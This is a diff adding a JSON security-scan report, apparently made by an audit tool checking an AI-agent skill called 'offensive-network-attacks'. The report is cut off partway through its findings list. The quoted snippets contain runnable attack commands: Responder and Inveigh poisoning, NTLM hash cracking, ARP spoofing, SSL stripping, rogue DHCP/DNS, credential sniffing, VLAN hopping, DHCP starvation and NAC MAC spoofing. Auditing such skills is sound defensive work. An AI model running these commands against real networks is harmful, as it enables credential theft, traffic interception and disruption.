@@ -1,0 +1,2372 @@
+{
+  "multi_skill": true,
+  "skill_count": 1,
+  "max_risk_score": 48,
+  "risk_severity": "MEDIUM",
+  "execution_successful": true,
+  "risk_recommendation": "CAUTION",
+  "analysis_completeness": {
+    "is_complete": true,
+    "execution_successful": true,
+    "status": "complete",
+    "coverage_percent": 100.0,
+    "fully_inspected_files": 1,
+    "partially_inspected_files": 0,
+    "entirely_uninspected_files": 0,
+    "total_files": 1,
+    "limitations": [],
+    "scope": "recursive_skills"
+  },
+  "skills_scanned": 1,
+  "skills_omitted": 0,
+  "skills_output_omitted": 0,
+  "public_finding_records": 45,
+  "report_characters": 89428,
+  "transitive_finding_count": 0,
+  "transitive_sources": [],
+  "skills": [
+    {
+      "name": "offensive-network-attacks",
+      "path": "offensive-network-attacks",
+      "risk_score": 48,
+      "risk_severity": "MEDIUM",
+      "finding_count": 3,
+      "execution_successful": true,
+      "transitive_finding_count": 0,
+      "transitive_sources": [],
+      "skill": {
+        "name": "offensive-network-attacks",
+        "source": "/Users/test/Desktop/neuron-surgery/skill-audit/repos/SnailSploit_Claude-Red/Skills/network/offensive-network-attacks",
+        "scanned_at": "2026-11-13T11:41:47.399275+00:00"
+      },
+      "risk_assessment": {
+        "score": 48,
+        "severity": "MEDIUM",
+        "recommendation": "CAUTION",
+        "max_issue_severity": "HIGH"
+      },
+      "components": [
+        {
+          "path": "SKILL.md",
+          "type": "markdown",
+          "lines": 491,
+          "executable": false,
+          "size_bytes": 20169,
+          "source_url": null,
+          "source_identity": null,
+          "source_digest": null
+        }
+      ],
+      "structured_summaries": [],
+      "issues": [
+        {
+          "id": "YR4",
+          "finding_id": "finding-9490b863ca2d4a08bf1a9378b36cd2e3",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'offensive_tool_references': References to well-known offensive security tools [hacktools]",
+          "severity": "HIGH",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 80,
+            "end_line": null
+          },
+          "finding": "hashcat -m; hashcat -m",
+          "explanation": "YARA rule matched a hack tool or exploit indicator (offensive tools, reconnaissance, privilege escalation, or exploit frameworks).",
+          "remediation": "Remove offensive tool references and exploit code. Legitimate agent skills should not contain penetration testing tools, exploit frameworks, or reconnaissance utilities.",
+          "code_snippet": ", and mDNS (UDP 5353). You answer these broadcast queries with your IP, forcing victims to authenticate to your rogue services.\n\n### Responder Setup and Hash Capture\n\n```bash\nsudo responder -I eth0 -A                    # analyze mode -- observe without poisoning\nsudo responder -I eth0 -wrf                  # full poisoning: -w WPAD, -r NBT-NS, -f fingerprint\n# Hashes land in /opt/Responder/logs/\nhashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule   # NTLMv2\nhashcat -m 5500 hashes.txt wordlist.txt                        # NTLMv1 (weaker)\n```\n\nWPAD is a high-value vector: browsers query for `wpad.dat` via DNS then LLMNR/NBT-NS. The `-w` flag makes Responder serve a malicious WPAD config that captures NTLM authentication from browser traffic transparently.\n\n### Inveigh (Windows-Native)\n\nFrom a compromised Windows host, poison without dropping Linux tools:\n\n```powershell\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTP Y -HTTPS Y -Proxy Y\nInveigh.exe -FileOutput Y -NBNS Y -m",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "evidence": {},
+          "match_fingerprint": "840413ed1263673fad1c2d44f641ecaa4bc5a01ea1ebf722dfa47bab9f4f42bd",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 80,
+              "end_line": null
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "TM2",
+          "finding_id": "finding-98f067465f57470a8afad33287858c91",
+          "category": "Tool Misuse",
+          "pattern": "Chaining Abuse",
+          "severity": "HIGH",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 290,
+            "end_line": null,
+            "start_column": 25
+          },
+          "finding": "&& sudo",
+          "explanation": "Tool calls are chained to bypass individual safety checks or escalate capabilities beyond what any single tool call would allow.",
+          "remediation": "Limit tool chaining depth and validate the output of each tool before passing it to the next. Require explicit user approval for multi-step chains.",
+          "code_snippet": "sudo tcpdump -i eth0 -e -c 100 | awk '{print $2}' | sort -u  # discover authorized MACs\nsudo ip link set eth0 down\nsudo ip link set eth0 address AA:BB:CC:DD:EE:FF\nsudo ip link set eth0 up && sudo dhclient eth0\n```\n\n### Hub / Bridge Insertion",
+          "intent": null,
+          "tags": [
+            "Tool Misuse"
+          ],
+          "evidence": {},
+          "match_fingerprint": "d54d4fa72a85501965b136126c5daeba7ca262314088bebfb309c2d7804c3dda",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 290,
+              "end_line": null,
+              "start_column": 25
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-05089f31329546e18f566697e7efc363",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 30,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "### Bettercap ARP Module\n\n```bash\nsudo bettercap -iface eth0\nnet.probe on                              # discover live hosts\nnet.show\nset arp.spoof.targets 10.0.0.50          # single target",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 30,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-77d080786e69420994f754c580424113",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 46,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "arpspoof -i eth0 -t 10.0.0.1 10.0.0.50   # tell gateway you are the victim (second terminal)\n\n# Ettercap alternative\nsudo ettercap -T -M arp:remote /10.0.0.50// /10.0.0.1//\nsudo ettercap -T -M arp:remote -F inject.ef /10.0.0.50// /10.0.0.1//  # with filter\n```\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 46,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-d303137aff0547ebb89e01202267dc33",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 47,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n# Ettercap alternative\nsudo ettercap -T -M arp:remote /10.0.0.50// /10.0.0.1//\nsudo ettercap -T -M arp:remote -F inject.ef /10.0.0.50// /10.0.0.1//  # with filter\n```\n\n### Gratuitous ARP with Scapy",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 47,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-06de5e378a874ea5b9c648a61761822c",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 77,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "### Responder Setup and Hash Capture\n\n```bash\nsudo responder -I eth0 -A                    # analyze mode -- observe without poisoning\nsudo responder -I eth0 -wrf                  # full poisoning: -w WPAD, -r NBT-NS, -f fingerprint\n# Hashes land in /opt/Responder/logs/\nhashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule   # NTLMv2",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 77,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-4c310bb176eb4bc584f211d34cdca3e2",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 78,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n```bash\nsudo responder -I eth0 -A                    # analyze mode -- observe without poisoning\nsudo responder -I eth0 -wrf                  # full poisoning: -w WPAD, -r NBT-NS, -f fingerprint\n# Hashes land in /opt/Responder/logs/\nhashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule   # NTLMv2\nhashcat -m 5500 hashes.txt wordlist.txt                        # NTLMv1 (weaker)",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 78,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-8acc1db2609c44dfb82c0757da466ff6",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 128,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "#   dhcp-option=6,10.0.0.99    # DNS\n#   address=/intranet.corp.local/10.0.0.99\n#   server=8.8.8.8\nsudo dnsmasq -C /etc/dnsmasq-rogue.conf -d\n```\n\n### DNS Cache Poisoning with Scapy",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 128,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-d8337eac34404fed9a3c5397492a9aa0",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 167,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "### Bettercap HTTP Proxy and SSL Strip\n\n```bash\nsudo bettercap -iface eth0\nset arp.spoof.targets 10.0.0.50\nset arp.spoof.fullduplex true\narp.spoof on",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 167,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-3cadfaf6de9e483097f1be2672296c60",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 197,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "tshark -r capture.pcap -Y \"ftp.request.command == USER || ftp.request.command == PASS\" \\\n  -T fields -e ftp.request.command -e ftp.request.arg\npython3 Pcredz -f capture.pcap           # automated extraction (NTLM, HTTP, FTP, SMTP, SNMP)\nsudo python3 net-creds.py -i eth0        # real-time credential sniffer\n```\n\n---",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 197,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-ce855b8df1654ea5b8567a60ecb6be97",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 209,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "If the switch port is in dynamic auto/desirable mode (common Cisco default), negotiate a trunk:\n\n```bash\nsudo yersinia dtp -attack 1 -interface eth0    # DTP trunk negotiation\nsudo tcpdump -i eth0 -nn -e vlan              # verify trunk formed\nsudo modprobe 8021q\nsudo vconfig add eth0 100                      # sub-interface for VLAN 100",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 209,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-b2c6bcf8efd943d582027b2d21bdaa41",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 210,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n```bash\nsudo yersinia dtp -attack 1 -interface eth0    # DTP trunk negotiation\nsudo tcpdump -i eth0 -nn -e vlan              # verify trunk formed\nsudo modprobe 8021q\nsudo vconfig add eth0 100                      # sub-interface for VLAN 100\nsudo ifconfig eth0.100 10.100.0.99 netmask 255.255.255.0 up",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 210,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-f6b3bb7e0aae48b4a872540fa505e1d4",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 211,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "```bash\nsudo yersinia dtp -attack 1 -interface eth0    # DTP trunk negotiation\nsudo tcpdump -i eth0 -nn -e vlan              # verify trunk formed\nsudo modprobe 8021q\nsudo vconfig add eth0 100                      # sub-interface for VLAN 100\nsudo ifconfig eth0.100 10.100.0.99 netmask 255.255.255.0 up\n```",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 211,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-c67e093067304eb3aff0ea8f2a55139b",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 212,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "sudo yersinia dtp -attack 1 -interface eth0    # DTP trunk negotiation\nsudo tcpdump -i eth0 -nn -e vlan              # verify trunk formed\nsudo modprobe 8021q\nsudo vconfig add eth0 100                      # sub-interface for VLAN 100\nsudo ifconfig eth0.100 10.100.0.99 netmask 255.255.255.0 up\n```\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 212,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-cc8a7dba3241485c8a3ca768fc42e06c",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 213,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "sudo tcpdump -i eth0 -nn -e vlan              # verify trunk formed\nsudo modprobe 8021q\nsudo vconfig add eth0 100                      # sub-interface for VLAN 100\nsudo ifconfig eth0.100 10.100.0.99 netmask 255.255.255.0 up\n```\n\n### Double Tagging (802.1Q)",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 213,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-125bef5828d6484ca28e29f3d098b0c9",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 237,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "### Yersinia Layer 2 Attacks\n\n```bash\nsudo yersinia stp -attack 4 -interface eth0  # STP root bridge takeover\nsudo yersinia cdp -attack 1 -interface eth0  # CDP flood (Cisco switches)\n```\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 237,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-b8c7ca5ee27849aeaf2d35def9e78135",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 238,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n```bash\nsudo yersinia stp -attack 4 -interface eth0  # STP root bridge takeover\nsudo yersinia cdp -attack 1 -interface eth0  # CDP flood (Cisco switches)\n```\n\n---",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 238,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-2d371e13611a4a28bcc4920089d236cc",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 250,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "Exhaust the pool so legitimate clients cannot get addresses:\n\n```bash\nsudo dhcpstarv -i eth0                         # dedicated starvation tool\nsudo yersinia dhcp -attack 1 -interface eth0   # Yersinia alternative\n```\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 250,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-da4d7594d56f4cb18c32199d85bbfaee",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 251,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n```bash\nsudo dhcpstarv -i eth0                         # dedicated starvation tool\nsudo yersinia dhcp -attack 1 -interface eth0   # Yersinia alternative\n```\n\n```python",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 251,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-c56c1af29bb546e785d62b1b26898dfe",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 273,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "```bash\n# /etc/dnsmasq-rogue.conf: interface=eth0, dhcp-range=10.0.0.100,10.0.0.200,255.255.255.0,12h\n#   dhcp-option=3,10.0.0.99 (gateway)   dhcp-option=6,10.0.0.99 (DNS)   dhcp-authoritative\nsudo dnsmasq -C /etc/dnsmasq-rogue.conf -d\necho 1 > /proc/sys/net/ipv4/ip_forward\niptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\n```",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 273,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-7b45379fe3354b45862b1c6162993585",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 287,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "If NAC uses MAC Authentication Bypass for printers/VoIP phones, spoof an authorized MAC:\n\n```bash\nsudo tcpdump -i eth0 -e -c 100 | awk '{print $2}' | sort -u  # discover authorized MACs\nsudo ip link set eth0 down\nsudo ip link set eth0 address AA:BB:CC:DD:EE:FF\nsudo ip link set eth0 up && sudo dhclient eth0",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 287,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-94c5b53dff0e456eb881984527d99bba",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 288,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n```bash\nsudo tcpdump -i eth0 -e -c 100 | awk '{print $2}' | sort -u  # discover authorized MACs\nsudo ip link set eth0 down\nsudo ip link set eth0 address AA:BB:CC:DD:EE:FF\nsudo ip link set eth0 up && sudo dhclient eth0\n```",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
